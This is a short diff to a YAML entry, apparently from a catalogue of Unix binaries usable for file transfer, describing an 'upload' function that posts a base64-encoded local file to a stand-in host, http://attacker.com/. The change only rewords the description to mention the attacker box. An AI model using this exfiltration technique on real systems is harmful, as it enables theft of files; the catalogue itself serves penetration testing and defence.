@@ -1,7 +1,7 @@
 ---
 functions:
   upload:
-    - description: Send base64-encoded local file via "d" parameter of a HTTP POST request. Run an HTTP service to collect the file on the other end.
+    - description: Send base64-encoded local file via "d" parameter of a HTTP POST request. Run an HTTP service on the attacker box to collect the file.
       code: |
         export URL=http://attacker.com/
         export LFILE=file_to_send
